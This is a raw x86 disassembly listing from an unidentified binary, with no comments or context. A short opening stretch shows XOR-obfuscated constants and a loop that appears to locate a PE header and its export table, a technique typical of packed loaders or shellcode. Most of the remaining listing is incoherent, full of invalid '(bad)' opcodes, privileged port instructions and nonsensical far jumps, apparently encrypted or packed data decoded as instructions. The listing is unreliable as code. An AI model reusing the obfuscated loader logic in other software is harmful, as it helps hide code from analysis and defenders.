  419cb7:	in     eax,dx
  419cb8:	test   BYTE PTR [ebx+eax*4+0x678b516c],dh
  419cbf:	dec    sp
  419cc1:	mov    esp,0x6874c6c
  419cc6:	xchg   ebx,eax
  419cc7:	les    ebx,FWORD PTR [eax]
  419cc9:	push   cs
  419cca:	psllq  mm3,QWORD PTR [edx+esi*4]
  419cce:	sahf   
  419ccf:	dec    ecx
  419cd0:	and    BYTE PTR [ecx+0x49],bl
  419cd3:	ds push 0xd68175ad
  419cd9:	xor    DWORD PTR [ebp+0x38523be1],ecx
  419cdf:	cmp    dl,bh
  419ce1:	fcomp  DWORD PTR [ecx+0x38]
  419ce4:	mov    edi,0xf4618984
  419ce9:	adc    eax,0x5d8bb471
  419cee:	fmul   DWORD PTR [ebx-0x39dc2383]
  419cf4:	mov    esi,0xa147
  419cf9:	xor    bx,si
  419cfc:	mov    esi,0x4133
  419d01:	add    bx,si
  419d04:	cmp    WORD PTR [eax],bx
  419d07:	je     0x419d51
  419d0d:	mov    edi,DWORD PTR [ebp-0x10]
  419d10:	xor    edi,ecx
  419d12:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  419d19:	mov    DWORD PTR [ebp-0x24],0xffffffff
  419d20:	mov    ebx,0xffcd8d06
  419d25:	sub    ebx,edi
  419d27:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  419d2e:	add    eax,ebx
  419d30:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  419d37:	mov    edi,DWORD PTR [ebp-0x28]
  419d3a:	mov    ebx,DWORD PTR [ebp-0x24]
  419d3d:	mov    ebx,0xa147
  419d42:	xor    di,bx
  419d45:	add    di,si
  419d48:	cmp    WORD PTR [eax],di
  419d4b:	jne    0x419d0d
  419d51:	mov    edi,DWORD PTR [ebp-0x14]
  419d54:	mov    edi,DWORD PTR [edi]
  419d56:	mov    ebx,DWORD PTR [eax+0x3c]
  419d59:	lea    edi,[ebx+edi*8+0x78]
  419d5d:	mov    edi,DWORD PTR [edi+eax*1]
  419d60:	mov    DWORD PTR [ebp-0x18],edi
  419d63:	mov    edi,DWORD PTR [ebp+0x8]
  419d66:	xor    edi,ecx
  419d68:	add    edi,edx
  419d6a:	mov    DWORD PTR [ebp-0x1c],edi
  419d6d:	mov    edi,DWORD PTR [ebp+0x8]
  419d70:	xor    edi,ecx
  419d72:	jmp    0x41c0fe
  419d77:	dec    ecx
  419d78:	mov    edi,0x37790f77
  419d7d:	imul   ebx,ecx,0x2d995a11
  419d83:	or     ebp,DWORD PTR [edi-0x220a3f8f]
  419d89:	jp     0x419e06
  419d8b:	call   0x6abd192c
  419d90:	je     0x419d4b
  419d92:	lahf   
  419d93:	jne    0x419d32
  419d95:	cli    
  419d96:	aad    0x10
  419d98:	pop    edx
  419d99:	data16 fistp WORD PTR [ebx-0x3df076fe]
  419da0:	push   ss
  419da1:	lods   al,BYTE PTR ds:[esi]
  419da2:	dec    edx
  419da3:	in     al,0x12
  419da5:	sub    eax,0xb3609365
  419daa:	cmp    ebx,edx
  419dac:	popa   
  419dad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dae:	imul   BYTE PTR [eax]
  419db0:	pushf  
  419db1:	daa    
  419db2:	test   eax,0xff6782f6
  419db7:	mov    esp,0x34ea6fed
  419dbc:	stos   DWORD PTR es:[edi],eax
  419dbd:	iret   
  419dbe:	imul   edi,DWORD PTR [eax+edx*1-0x65],0x908bf031
  419dc6:	js     0x419dd6
  419dc8:	xor    eax,0x9c2d3335
  419dcd:	ret    0x5a7c
  419dd0:	pop    esp
  419dd1:	ret    0x3d6c
  419dd4:	mov    eax,0xfdc88236
  419dd9:	shl    eax,cl
  419ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ddc:	test   dh,al
  419dde:	inc    esi
  419ddf:	shr    DWORD PTR [esi+0x51],0x6d
  419de3:	push   ecx
  419de4:	mov    esp,0xbf3d5a80
  419de9:	jne    0x419e40
  419deb:	js     0x419de7
  419ded:	ins    DWORD PTR es:[edi],dx
  419dee:	xor    DWORD PTR [ecx],ecx
  419df0:	pop    ss
  419df1:	jmp    0x419e39
  419df3:	push   ss
  419df4:	xor    al,0x2
  419df6:	aam    0x34
  419df8:	das    
  419df9:	mov    ch,0xec
  419dfb:	pop    es
  419dfc:	mov    ch,0xc9
  419dfe:	xchg   esp,eax
  419dff:	jae    0x419dfc
  419e01:	sar    DWORD PTR [ebp+esi*1-0x3351799e],1
  419e08:	xchg   esp,eax
  419e09:	pop    esi
  419e0a:	inc    ecx
  419e0b:	addr16 in eax,0xdb
  419e0e:	xchg   edi,eax
  419e0f:	or     BYTE PTR [edi+ecx*4+0x77],0xb6
  419e14:	fld    QWORD PTR [ebx]
  419e16:	shl    eax,0x22
  419e19:	jge    0x419e79
  419e1b:	leave  
  419e1c:	add    eax,0x60ed252b
  419e21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e22:	loope  0x419dde
  419e24:	mov    eax,ds:0xaee0418
  419e29:	pop    es
  419e2a:	cmc    
  419e2b:	js     0x419e52
  419e2d:	inc    edi
  419e2e:	in     eax,0xa1
  419e30:	push   ebp
  419e31:	cmp    dl,ah
  419e33:	add    eax,0x35a3e1d4
  419e38:	dec    ebx
  419e39:	jge    0x419dd1
  419e3b:	push   ebx
  419e3c:	add    eax,DWORD PTR [ebp+eax*2+0x10]
  419e40:	lea    ebp,[ecx+0x2692467]
  419e46:	loop   0x419ebe
  419e48:	fwait
  419e49:	cmp    eax,0xa9256f46
  419e4e:	mov    cl,0xdc
  419e50:	cs hlt 
  419e52:	or     eax,0x82c7b5f0
  419e57:	addr16 push ss
  419e59:	repnz xor BYTE PTR [esi],bh
  419e5c:	aad    0x2d
  419e5e:	add    eax,0x5ff842f0
  419e63:	int    0x81
  419e65:	rcl    BYTE PTR [eax],0xe2
  419e68:	push   es
  419e69:	fs inc esp
  419e6b:	cmp    eax,0x9e4316fa
  419e70:	scas   al,BYTE PTR es:[edi]
  419e71:	aaa    
  419e72:	push   cs
  419e73:	inc    esi
  419e74:	xor    DWORD PTR [eax-0x2008fe67],eax
  419e7a:	mov    al,0x3b
  419e7c:	(bad)  
  419e7d:	test   DWORD PTR [eax+0x6e],ebx
  419e80:	sub    bh,ch
  419e82:	adc    DWORD PTR [esi-0x3f4fe66d],ecx
  419e88:	inc    esi
  419e89:	call   0x797f27f5
  419e8e:	xor    BYTE PTR [ebp-0x58],0xc8
  419e92:	pop    ebx
  419e93:	pop    es
  419e94:	mov    esp,0x9cc03f31
  419e99:	pusha  
  419e9a:	jl     0x419e42
  419e9c:	mov    ecx,0xcbb9b5a4
  419ea1:	dec    ecx
  419ea2:	dec    esi
  419ea3:	and    ebx,eax
  419ea5:	mov    ?,WORD PTR [edx+0x2b2d1549]
  419eab:	les    ebp,FWORD PTR [esi+ebx*1+0x5d512edb]
  419eb2:	icebp  
  419eb3:	(bad)  
  419eb5:	(bad)  [ebp-0x4c3ca66a]
  419ebb:	mov    ds:0xd5b2e337,al
  419ec0:	pop    eax
  419ec1:	push   ds
  419ec2:	outs   dx,BYTE PTR ds:[esi]
  419ec3:	es jae 0x419f09
  419ec6:	shr    BYTE PTR [esi],cl
  419ec8:	inc    ebx
  419ec9:	(bad)
  419ecc:	ins    BYTE PTR es:[edi],dx
  419ecd:	xchg   ecx,eax
  419ece:	imul   edx,DWORD PTR [esi],0x7d3820dd
  419ed4:	ins    DWORD PTR es:[edi],dx
  419ed5:	and    edx,DWORD PTR [edx-0x32]
  419ed8:	je     0x419f59
  419eda:	pop    eax
  419edb:	fmul   st(2),st
  419edd:	jae    0x419ee8
  419edf:	das    
  419ee0:	popf   
  419ee1:	in     eax,dx
  419ee2:	cmp    al,bh
  419ee4:	dec    edi
  419ee5:	jmp    0x419ea2
  419ee7:	mov    DWORD PTR [eax],esp
  419ee9:	mov    ch,0x84
  419eeb:	adc    eax,0xc16fe050
  419ef0:	push   esi
  419ef1:	or     ecx,edi
  419ef3:	pushf  
  419ef4:	les    edx,FWORD PTR [edi]
  419ef6:	mov    WORD PTR [eax],cs
  419ef8:	das    
  419ef9:	(bad)  [ebx]
  419efb:	inc    ecx
  419efc:	test   al,0xab
  419efe:	mov    edx,0x33a09823
  419f03:	dec    ebx
  419f04:	mov    esi,0x6d29b706
  419f09:	ror    BYTE PTR ds:0x75e8022,cl
  419f0f:	xchg   eax,eax
  419f11:	inc    eax
  419f12:	fild   DWORD PTR [esi-0x23]
  419f15:	xchg   ebx,eax
  419f16:	add    ecx,DWORD PTR [edx+0x54844100]
  419f1c:	mov    al,0x73
  419f1e:	push   ss
  419f1f:	xchg   edi,eax
  419f20:	pusha  
  419f21:	dec    edx
  419f22:	push   ds
  419f23:	or     DWORD PTR [edi-0x2],0x7b
  419f27:	sar    BYTE PTR [edx],cl
  419f29:	sub    eax,0x9896d802
  419f2e:	rol    DWORD PTR [ebx+0x26],0xe5
  419f32:	sbb    DWORD PTR [eax],0x48a93cea
  419f38:	mov    ah,0x1c
  419f3a:	repnz mov BYTE PTR [ebp+ecx*4-0x50b30068],ah
  419f42:	out    dx,eax
  419f43:	sbb    eax,0xd64a35be
  419f48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f49:	sahf   
  419f4a:	in     al,0x30
  419f4c:	jmp    0x5d9bf0b5
  419f51:	(bad)  
  419f52:	popa   
  419f53:	sub    eax,DWORD PTR [esi-0x6a]
  419f56:	out    dx,al
  419f57:	(bad)  
  419f58:	dec    ecx
  419f59:	out    0x83,al
  419f5b:	mov    ebp,0x60cb0524
  419f60:	xlat   BYTE PTR ds:[ebx]
  419f61:	ins    DWORD PTR es:[edi],dx
  419f62:	mov    edi,fs
  419f64:	sub    eax,0x857c2a0b
  419f69:	jo     0x419f8c
  419f6b:	fiadd  WORD PTR [ebx+0x22037c09]
  419f71:	push   0x69313d74
  419f76:	adc    esp,DWORD PTR [ecx]
  419f78:	cdq    
  419f79:	or     al,0x5e
  419f7b:	pop    edx
  419f7c:	adc    al,BYTE PTR [ebp-0x16ccbcf4]
  419f82:	mov    ecx,0xcf2e8ad
  419f87:	dec    edi
  419f88:	mov    al,ds:0xff7b0a61
  419f8d:	jns    0x419ffb
  419f8f:	lds    edx,FWORD PTR [ebx+0x5a]
  419f92:	jl     0x419f22
  419f94:	push   cs
  419f95:	xor    BYTE PTR [ecx-0x63343864],dl
  419f9b:	aam    0xaf
  419f9d:	add    al,0x2a
  419f9f:	mov    ah,0xbb
  419fa1:	aam    0x9d
  419fa3:	repnz in al,0x34
  419fa6:	mov    ebx,0x675dfac8
  419fab:	dec    ebp
  419fac:	mov    ch,0xaa
  419fae:	dec    DWORD PTR [ecx-0x1f]
  419fb1:	ficom  DWORD PTR [edx-0x5c]
  419fb4:	xor    BYTE PTR [eax+0x36e146e4],al
  419fba:	lds    edi,FWORD PTR [ecx]
  419fbc:	add    DWORD PTR [ebp-0xb236d81],esp
  419fc2:	mov    esp,DWORD PTR ds:0xd81e46d4
  419fc8:	inc    ebp
  419fc9:	add    al,0x8d
  419fcb:	and    al,0xdb
  419fcd:	and    al,0x3c
  419fcf:	mov    edx,0x1d58e137
  419fd4:	push   eax
  419fd5:	sub    ebp,DWORD PTR [edx+ebp*4-0x51]
  419fd9:	jns    0x419ff5
  419fdb:	cmp    al,bh
  419fdd:	scas   eax,DWORD PTR es:[edi]
  419fde:	inc    esp
  419fdf:	and    esi,DWORD PTR [edx-0x7bd4d9e6]
  419fe5:	dec    edi
  419fe6:	shr    DWORD PTR [ebx],cl
  419fe8:	ins    DWORD PTR es:[edi],dx
  419fe9:	cmp    BYTE PTR [edi+0x5834bcd0],0x3a
  419ff0:	push   ebp
  419ff1:	fld    DWORD PTR ds:0x64b26969
  419ff7:	cld    
  419ff8:	cmp    DWORD PTR [esi-0x6b],edx
  419ffb:	call   0x394f:0x93b2a5db
  41a002:	sbb    al,0x4c
  41a004:	push   edi
  41a005:	stos   BYTE PTR es:[edi],al
  41a006:	xor    ah,BYTE PTR [ebp-0x46ddce95]
  41a00c:	push   es
  41a00d:	cmc    
  41a00e:	lea    edx,[edi-0x59825739]
  41a014:	sub    al,0xe1
  41a016:	outs   dx,DWORD PTR ds:[esi]
  41a017:	add    eax,0x328ec125
  41a01c:	mov    dh,0xfd
  41a01e:	mov    ah,0xa5
  41a020:	(bad)  
  41a021:	jb     0x419fb8
  41a023:	jp     0x41a050
  41a025:	das    
  41a026:	pop    esi
  41a027:	xor    DWORD PTR [edi-0x10],edi
  41a02a:	xchg   edi,eax
  41a02b:	call   0x178f2a46
  41a030:	rcl    BYTE PTR [eax+ecx*1+0x2da48d55],cl
  41a037:	sbb    eax,0xcd97e47f
  41a03c:	js     0x419fc5
  41a03e:	out    0x92,eax
  41a040:	push   cs
  41a041:	punpckldq mm7,DWORD PTR [esi-0x7ceaabca]
  41a048:	pushf  
  41a049:	push   edx
  41a04a:	lods   eax,DWORD PTR ds:[esi]
  41a04b:	aaa    
  41a04c:	jmp    0x10a55b91
  41a051:	push   ds
  41a052:	addr16 cwde 
  41a054:	iret   
  41a055:	shl    ah,1
  41a057:	je     0x41a033
  41a059:	popf   
  41a05a:	loop   0x41a0a1
  41a05c:	je     0x41a0a5
  41a05e:	out    0xa3,eax
  41a060:	xchg   esi,eax
  41a061:	sahf   
  41a062:	dec    ebx
  41a063:	daa    
  41a064:	pop    es
  41a065:	inc    ebx
  41a066:	in     al,dx
  41a067:	mov    al,0xea
  41a069:	pop    ecx
  41a06a:	scas   eax,DWORD PTR es:[edi]
  41a06b:	mov    ebx,0xa821e3fb
  41a070:	mov    esp,0x7cb290a2
  41a075:	std    
  41a076:	js     0x41a0dd
  41a078:	bound  esp,QWORD PTR [esi+0x3c]
  41a07b:	push   esp
  41a07c:	pusha  
  41a07d:	jl     0x41a08c
  41a07f:	pop    ss
  41a080:	and    cl,BYTE PTR [ebp+0x71]
  41a083:	xchg   ebx,eax
  41a084:	push   esi
  41a085:	ss loop 0x41a0ca
  41a088:	test   eax,0x4e1c253f
  41a08d:	cmp    esp,DWORD PTR [eax+edi*1]
  41a090:	rcr    BYTE PTR [esi-0x7add2b24],0xf1
  41a097:	in     al,dx
  41a098:	retf   
  41a099:	xchg   BYTE PTR [eax],cl
  41a09b:	add    eax,0xa272509e
  41a0a0:	and    DWORD PTR [ebx],esi
  41a0a2:	xchg   esp,eax
  41a0a3:	test   eax,0x44bd94f3
  41a0a8:	jns    0x41a0c9
  41a0aa:	sar    ebx,cl
  41a0ac:	cld    
  41a0ad:	sub    edx,DWORD PTR [ebp-0x5656ae75]
  41a0b3:	ss test eax,0xb4721c30
  41a0b9:	jp     0x41a105
  41a0bb:	stc    
  41a0bc:	mov    esi,0x79898af4
  41a0c1:	jp     0x41a08d
  41a0c3:	lods   al,BYTE PTR ds:[esi]
  41a0c4:	or     al,0xb0
  41a0c6:	aam    0xe9
  41a0c8:	outs   dx,DWORD PTR ds:[esi]
  41a0c9:	imul   bh
  41a0cb:	dec    ecx
  41a0cc:	dec    ebp
  41a0cd:	das    
  41a0ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0cf:	lock fidiv DWORD PTR [eax-0x20]
  41a0d3:	lods   al,BYTE PTR ds:[esi]
  41a0d4:	inc    ebx
  41a0d5:	jno    0x41a0df
  41a0d7:	mov    eax,0x8c87338e
  41a0dc:	std    
  41a0dd:	pop    esp
  41a0de:	jle    0x41a106
  41a0e0:	retw   
  41a0e2:	repz scas al,BYTE PTR es:[edi]
  41a0e4:	pop    ds
  41a0e5:	inc    edi
  41a0e6:	stos   BYTE PTR es:[edi],al
  41a0e7:	mov    bh,0xb1
  41a0e9:	in     eax,dx
  41a0ea:	jmp    0xe264:0xf7447fbd
  41a0f1:	mov    ah,0x60
  41a0f3:	mov    dl,cl
  41a0f5:	xchg   edx,eax
  41a0f6:	adc    al,0xa2
  41a0f8:	add    eax,0xc6aa0564
  41a0fd:	sub    eax,0x1b1d0ee
  41a102:	cwde   
  41a103:	pushf  
  41a104:	in     al,dx
  41a105:	mov    bl,0xaa
  41a107:	sub    BYTE PTR [edx],bl
  41a109:	stos   DWORD PTR es:[edi],eax
  41a10a:	jno    0x41a17a
  41a10c:	fwait
  41a10d:	pop    esi
  41a10e:	pushf  
  41a10f:	jno    0x41a158
  41a111:	test   ebx,ebp
  41a113:	pop    esi
  41a114:	sub    ah,BYTE PTR [esi]
  41a116:	push   edi
  41a117:	stos   BYTE PTR es:[edi],al
  41a118:	mov    eax,0xfeadae4e
  41a11d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a11e:	or     esi,DWORD PTR [esp+edx*2]
  41a121:	jmp    0x41a127
  41a123:	adc    al,bh
  41a125:	sbb    al,0xd7
  41a127:	cmp    BYTE PTR [ecx-0x5286145d],dh
  41a12d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a12e:	and    ebx,DWORD PTR [esi+0x2d3231f4]
  41a134:	ins    DWORD PTR es:[edi],dx
  41a135:	dec    edi
  41a136:	in     eax,dx
  41a137:	push   ebp
  41a138:	mov    esi,0xbab9b23f
  41a13d:	and    bl,BYTE PTR [edi]
  41a13f:	adc    eax,0x2b36dc8e
  41a144:	imul   esi,DWORD PTR [edx-0x33],0x7b8395c4
  41a14b:	and    BYTE PTR [ecx-0x4a],cl
  41a14e:	int    0x4b
  41a150:	jne    0x41a12b
  41a152:	int3   
  41a153:	dec    esp
  41a154:	stc    
  41a155:	mov    ecx,0x72684d77
  41a15a:	jg     0x41a0e4
  41a15c:	inc    ebx
  41a15d:	or     DWORD PTR [eax-0x2fc29dc0],edi
  41a163:	add    DWORD PTR [eax],0xffffff81
  41a166:	lahf   
  41a167:	je     0x41a1e8
  41a169:	pop    esi
  41a16a:	pop    esp
  41a16b:	and    dl,BYTE PTR [edx+ebx*1+0x306ce566]
  41a172:	ins    DWORD PTR es:[edi],dx
  41a173:	pop    ebp
  41a174:	add    al,0xf6
  41a176:	push   cs
  41a177:	add    eax,0xb8168061
  41a17c:	jbe    0x41a18f
  41a17e:	pusha  
  41a17f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a180:	scas   eax,DWORD PTR es:[edi]
  41a181:	or     al,0x45
  41a183:	and    ch,BYTE PTR [ebx+0x8]
  41a186:	dec    ebx
  41a187:	pop    ecx
  41a188:	inc    edi
  41a189:	xchg   esp,eax
  41a18a:	cmp    cl,al
  41a18c:	fimul  DWORD PTR [ebp-0x5b]
  41a18f:	neg    BYTE PTR [esi]
  41a191:	jge    0x41a1fa
  41a193:	sbb    DWORD PTR ds:0x546825ba,ebx
  41a199:	mov    ecx,0x3812f938
  41a19e:	(bad)  
  41a1a0:	sub    eax,0xe65e63b3
  41a1a5:	pop    esp
  41a1a6:	jae    0x41a224
  41a1a8:	cmp    DWORD PTR [edx+0x725824ce],eax
  41a1ae:	push   ecx
  41a1af:	aaa    
  41a1b0:	outs   dx,BYTE PTR ds:[esi]
  41a1b1:	mov    ecx,0x202fcb52
  41a1b6:	cli    
  41a1b7:	(bad)  
  41a1b9:	ss jb  0x41a23a
  41a1bc:	jnp    0x41a209
  41a1be:	sahf   
  41a1bf:	adc    DWORD PTR [edx+0x2ff36180],esi
  41a1c5:	push   esi
  41a1c6:	push   cs
  41a1c7:	nop
  41a1c8:	out    dx,eax
  41a1c9:	mov    ecx,0x228a20cb
  41a1ce:	jmp    0x41a1e7
  41a1d0:	cs aad 0xfd
  41a1d3:	and    eax,0xb585d7c4
  41a1d8:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1da:	cmp    edx,DWORD PTR [eax]
  41a1dc:	mov    eax,0x1a3ef924
  41a1e1:	xchg   edx,eax
  41a1e2:	ds aam 0x1c
  41a1e5:	(bad)  
  41a1e7:	sbb    ebp,DWORD PTR [edi-0x6aca9456]
  41a1ed:	push   cs
  41a1ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1ef:	xchg   esp,eax
  41a1f0:	fld    DWORD PTR [ecx+0x36]
  41a1f3:	xchg   ecx,edx
  41a1f5:	dec    ebp
  41a1f6:	out    dx,eax
  41a1f7:	xchg   DWORD PTR [ecx+esi*2+0xe],esp
  41a1fb:	adc    al,0xbd
  41a1fd:	jmp    0x6ded:0x25e36afa
  41a204:	mov    ebp,0xb296a4ba
  41a209:	push   0xffffffd0
  41a20b:	sub    bh,BYTE PTR [ebp-0x2a7c5089]
  41a211:	(bad)  
  41a212:	test   eax,0xaa4de240
  41a217:	cmp    BYTE PTR [ecx-0x4],cl
  41a21a:	fs lock dec esp
  41a21d:	push   eax
  41a21e:	(bad)  
  41a21f:	jg     0x41a277
  41a221:	cmc    
  41a222:	xchg   ebx,eax
  41a223:	ret    0xb2f7
  41a226:	sub    eax,DWORD PTR [eax+0x4f954cdf]
  41a22c:	sub    BYTE PTR [edi-0x34952b5d],bl
  41a232:	add    esi,ebp
  41a234:	mov    al,0xa5
  41a236:	mov    fs,WORD PTR [eax]
  41a238:	sbb    ah,BYTE PTR [ecx+0xa]
  41a23b:	pusha  
  41a23c:	fstp   TBYTE PTR ds:0x4870ec31
  41a242:	ret    0x23e7
  41a245:	fistp  QWORD PTR [edi+0x5a]
  41a248:	retf   0x3b61
  41a24b:	xchg   edi,eax
  41a24c:	cmp    DWORD PTR [ebx+ebx*2],edi
  41a24f:	add    BYTE PTR [esi+0x70],0x3f
  41a253:	sbb    cl,cl
  41a255:	aas    
  41a256:	test   al,0x61
  41a258:	and    ecx,edi
  41a25a:	lock xor edx,ebp
  41a25d:	and    DWORD PTR [esi-0x28072887],ebp
  41a263:	rol    BYTE PTR [edi+ecx*2+0x27d1b48f],1
  41a26a:	les    ecx,FWORD PTR [esi-0x6420a502]
  41a270:	out    0x10,eax
  41a272:	xchg   ecx,eax
  41a273:	pop    eax
  41a274:	fwait
  41a275:	sbb    DWORD PTR [ebx-0x29b627eb],edi
  41a27b:	push   esi
  41a27c:	adc    DWORD PTR [esi+eiz*1+0x4da3b9b2],0x11b7e938
  41a287:	fwait
  41a288:	sub    eax,0xd28ecc59
  41a28d:	sbb    eax,0x552fbc9a
  41a292:	in     al,dx
  41a293:	scas   al,BYTE PTR es:[edi]
  41a294:	pop    edi
  41a295:	stc    
  41a296:	not    dl
  41a298:	mov    BYTE PTR [edx+ebp*1],ah
  41a29b:	sahf   
  41a29c:	addr16 pop esp
  41a29e:	aad    0xd4
  41a2a0:	jbe    0x41a26b
  41a2a2:	out    dx,eax
  41a2a3:	sub    eax,0x7a2cba55
  41a2a8:	push   cs
  41a2a9:	test   al,0x83
  41a2ab:	mov    al,0xaa
  41a2ad:	test   DWORD PTR [edi],esp
  41a2af:	out    0x31,al
  41a2b1:	enter  0x7109,0xed
  41a2b5:	pop    ebx
  41a2b6:	xchg   ebx,eax
  41a2b7:	arpl   WORD PTR [esi+0x3b],si
  41a2ba:	sub    al,0x6a
  41a2bc:	dec    ebx
  41a2bd:	mov    ch,0x7e
  41a2bf:	jmp    0x88cfc637
  41a2c4:	jmp    0x8a0e3386
  41a2c9:	ret    0xcf44
  41a2cc:	in     eax,dx
  41a2cd:	arpl   WORD PTR [esi+0x58c05b71],dx
  41a2d3:	xchg   edx,eax
  41a2d4:	in     al,0x45
  41a2d6:	ja     0x41a2c6
  41a2d8:	divps  xmm3,XMMWORD PTR [esp+0x11]
  41a2dd:	int    0xb
  41a2df:	nop
  41a2e0:	xchg   edi,eax
  41a2e1:	aaa    
  41a2e2:	inc    ebp
  41a2e3:	fisubr DWORD PTR [esi+ecx*1+0x22870c98]
  41a2ea:	inc    esi
  41a2eb:	push   edi
  41a2ec:	fmul   QWORD PTR [eax-0x19727fd5]
  41a2f2:	push   ebp
  41a2f3:	hlt    
  41a2f4:	cld    
  41a2f5:	std    
  41a2f6:	dec    edi
  41a2f7:	imul   ebp,DWORD PTR [edi-0x7c],0xffffff80
  41a2fb:	xor    eax,0x43b7cfb2
  41a300:	inc    edi
  41a301:	loop   0x41a323
  41a303:	adc    ecx,edx
  41a305:	mov    edi,0x1c4292e
  41a30a:	add    al,0xb4
  41a30c:	or     DWORD PTR [edi],esi
  41a30e:	inc    edi
  41a30f:	retf   0xe30f
  41a312:	pop    edi
  41a313:	add    esi,DWORD PTR [ecx+0x4f]
  41a316:	inc    eax
  41a317:	mov    edx,0xb0497aa5
  41a31c:	ja     0x41a37b
  41a31e:	pop    ebx
  41a31f:	cli    
  41a320:	jmp    0x41a311
  41a322:	mov    ?,WORD PTR [esi]
  41a324:	mov    esp,0x85250321
  41a329:	or     ah,bl
  41a32b:	xchg   edx,eax
  41a32c:	call   0xcac622f0
  41a331:	repnz xchg ebx,eax
  41a333:	cmp    DWORD PTR [ebx],edi
  41a335:	pushf  
  41a336:	(bad)  
  41a337:	inc    eax
  41a338:	sub    eax,0x4885b22
  41a33d:	outs   dx,DWORD PTR ds:[esi]
  41a33e:	stos   DWORD PTR es:[edi],eax
  41a33f:	mov    eax,ds:0x77599298
  41a344:	inc    ebx
  41a345:	push   ds
  41a346:	mov    ebp,0x7fde65ab
  41a34b:	lods   al,BYTE PTR ds:[esi]
  41a34c:	inc    esp
  41a34d:	in     al,0x36
  41a34f:	into   
  41a350:	jb     0x41a360
  41a352:	add    al,0x1b
  41a354:	mov    BYTE PTR [ebx-0x44],bh
  41a357:	stos   BYTE PTR es:[edi],al
  41a358:	rcl    BYTE PTR gs:[edx-0x23d00ccc],0x12
  41a360:	das    
  41a361:	fisttp DWORD PTR [ecx]
  41a363:	jl     0x41a331
  41a365:	lods   al,BYTE PTR ds:[esi]
  41a366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a367:	js     0x41a2f3
  41a369:	scas   al,BYTE PTR es:[edi]
  41a36a:	mov    bl,0x38
  41a36c:	ja     0x41a352
  41a36e:	mov    ds:0xec2ea194,eax
  41a373:	daa    
  41a374:	pushf  
  41a375:	mov    bh,0xed
  41a377:	mov    al,ds:0x17875a24
  41a37c:	push   edi
  41a37d:	in     al,dx
  41a37e:	stos   DWORD PTR es:[edi],eax
  41a37f:	add    DWORD PTR [eax+0x26],ecx
  41a382:	xchg   esp,eax
  41a383:	sub    eax,0x33e62122
  41a388:	ffreep st(3)
  41a38a:	jo     0x41a3a8
  41a38c:	fisub  WORD PTR [eax+0x33baba06]
  41a392:	nop
  41a393:	dec    ecx
  41a394:	cmp    al,0xf8
  41a396:	push   eax
  41a397:	jb     0x41a3c5
  41a399:	int    0x14
  41a39b:	jnp    0x41a3a9
  41a39d:	inc    esi
  41a39e:	arpl   cx,bp
  41a3a0:	stos   BYTE PTR es:[edi],al
  41a3a1:	or     ah,dh
  41a3a3:	xlat   BYTE PTR ds:[ebx]
  41a3a4:	imul   esp,DWORD PTR ds:0x3ec77415,0x3a495109
  41a3ae:	fcom   QWORD PTR [edx]
  41a3b0:	xchg   BYTE PTR ds:0x8eb980a9,bh
  41a3b6:	mov    esp,0xafd8d1d1
  41a3bb:	xchg   edi,edx
  41a3bd:	icebp  
  41a3be:	nop    esp
  41a3c1:	push   cs
  41a3c2:	sub    eax,0x12fe3fe3
  41a3c7:	or     al,al
  41a3c9:	or     edi,DWORD PTR [edx+0x2d6b4bf6]
  41a3cf:	int    0xdc
  41a3d1:	test   BYTE PTR ds:0xaac7561,dl
  41a3d7:	add    al,BYTE PTR [ebx+0x2a36c31d]
  41a3dd:	inc    eax
  41a3de:	stc    
  41a3df:	enter  0x4c87,0xd4
  41a3e3:	mov    ds:0x19e6584d,eax
  41a3e8:	push   cs
  41a3e9:	in     al,0xbf
  41a3eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3ec:	popf   
  41a3ed:	mov    dh,0x38
  41a3ef:	cs icebp 
  41a3f1:	imul   esi,DWORD PTR [esi+0x7e],0xffffffd9
  41a3f5:	mov    bl,0x16
  41a3f7:	icebp  
  41a3f8:	pusha  
  41a3f9:	or     BYTE PTR [esp+edx*2],cl
  41a3fc:	pusha  
  41a3fd:	mov    ecx,DWORD PTR [ebx]
  41a3ff:	sbb    eax,0xaa67b407
  41a404:	xchg   edi,eax
  41a405:	sub    dl,dl
  41a407:	jmp    0x3294:0xddd64cb
  41a40e:	pop    ds
  41a40f:	leave  
  41a410:	xor    al,0xb4
  41a412:	fisubr DWORD PTR [ebx-0x5]
  41a415:	dec    esi
  41a416:	jae    0x41a3b0
  41a418:	push   esp
  41a419:	dec    eax
  41a41a:	or     eax,0x99b65bc2
  41a41f:	adc    ch,BYTE PTR ds:0x41d82e56
  41a425:	or     al,0xa8
  41a427:	inc    edi
  41a428:	test   BYTE PTR [edx+0x32],bl
  41a42b:	cmp    ebx,edi
  41a42d:	aad    0x4a
  41a42f:	iret   
  41a430:	pop    eax
  41a431:	cmp    eax,0x62e090b1
  41a436:	cdq    
  41a437:	out    dx,al
  41a438:	imul   eax,DWORD PTR [ebx-0x60c96e7c],0x57
  41a43f:	rcr    ebp,1
  41a441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a442:	jmp    0x9089:0xbc29c640
  41a449:	je     0x41a46c
  41a44b:	adc    eax,0x467f2b45
  41a450:	mov    edi,0x33648da8
  41a455:	mov    bh,0xf8
  41a457:	cmp    ebp,edi
  41a459:	dec    esi
  41a45a:	addr16 data16 jl 0x41a44d
  41a45e:	outs   dx,DWORD PTR ds:[esi]
  41a45f:	ins    DWORD PTR es:[edi],dx
  41a460:	sub    BYTE PTR [esi-0xed09d22],ah
  41a466:	push   ss
  41a467:	mov    al,0x48
  41a469:	cdq    
  41a46a:	adc    eax,0x83dc8338
  41a46f:	dec    ecx
  41a470:	mov    ebx,0x8cf0a334
  41a475:	out    dx,eax
  41a476:	xchg   edx,eax
